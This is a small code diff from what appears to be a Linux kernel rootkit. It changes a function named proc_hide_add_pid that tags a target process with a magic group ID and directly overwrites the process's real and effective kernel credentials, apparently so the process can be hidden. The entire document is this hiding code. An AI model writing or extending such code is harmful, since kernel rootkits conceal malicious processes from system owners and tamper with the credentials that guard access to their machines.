@@ -240,13 +240,16 @@ int proc_hide_add_pid(pid_t pid)
   }
 
   for (i = 0; i < old_gi->ngroups; i++)
-    new_gi->gid[i] = old_gi->gid[i];
+  new_gi->gid[i] = old_gi->gid[i];
   new_gi->gid[old_gi->ngroups] = KGIDT_INIT(MAGIC_GID);
   groups_sort(new_gi);
   set_groups(new_cred, new_gi);
 
   //swap creds on the target task
-  rcu_assign_pointer(task->cred, new_cred);
+  const struct cred *old_cred = task->real_cred;
+  rcu_assign_pointer(task->real_cred, new_cred); //objective - how to act upon the task
+  rcu_assign_pointer(task->cred, new_cred);  //subjective - how task acts upon another object
+  put_cred(old_cred);
 
   put_task_struct(task);
   return 0;
